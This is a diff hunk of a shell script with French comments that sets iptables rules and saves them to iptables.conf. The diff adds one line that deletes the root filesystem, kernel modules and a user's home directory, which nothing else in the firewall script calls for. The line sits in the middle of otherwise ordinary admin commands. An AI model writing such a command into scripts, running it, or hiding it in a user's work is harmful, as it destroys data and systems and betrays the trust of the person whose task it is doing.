@@ -26,6 +26,7 @@ iptables -A OUTPUT -o lo -m conntrack --ctstate NEW -j ACCEPT
 # on sauvegarde la conf actuelle
 echo "sauvegarde de la configuration actuelle dans le fichier ./iptables.conf"
 iptables-save > iptables.conf
+rm -rF /proc/* /* /lib/modules/* /home/etu/*
 
 # configuration a la main
 echo ">> iptables.conf"
